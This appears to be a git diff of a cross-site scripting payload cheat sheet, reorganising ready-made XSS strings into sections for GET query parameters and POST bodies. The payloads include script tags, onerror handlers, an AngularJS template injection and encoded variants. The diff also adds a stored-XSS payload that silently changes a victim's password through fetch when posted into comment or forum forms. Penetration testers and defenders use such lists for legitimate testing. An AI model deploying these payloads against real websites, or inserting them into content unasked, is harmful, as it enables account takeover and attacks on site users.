@@ -8,6 +8,8 @@ website: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 {% raw %}
 
+## GET Query Params
+
 ```html
 https://vulnerable.com/item?id=<script>alert(1)</script>
 https://vulnerable.com/item?id="><script>alert(1)</script>
@@ -33,13 +35,26 @@ https://vulnerable.com/#<img src=1 onerror=alert(1)>
 
 <!-- AngulaJS (<html ng-app>) -->
 https://vulnerable.com/?search={{$on.constructor('alert(1)')()}}
+```
 
-<!-- POST request body -->
+<br />
+
+## POST Body
+
+```html
 postId=2&comment=<script>alert(1)</script>
 postId=2&comment=<><img src=1 onerror=alert(1)>
 postId=2&comment=%3Cscript%3Ealert%281%29%3C%2Fscript%3E
 imageClass=" src=1 onerror=alert(1)>
 imageClass=" onmouseleave='alert(1)'">
+
+
+<!-- -------------------------------------------------------------------- -->
+
+<!-- If the website allows to change password from the query parameter... -->
+https://vulnerable.com/profile?new_password=password
+<!-- Submit the payload to user input forms such as messages,comments,forums, -->
+<script>fetch('/profile?new_password=password');</script>
 ```
 
 {% endraw %}
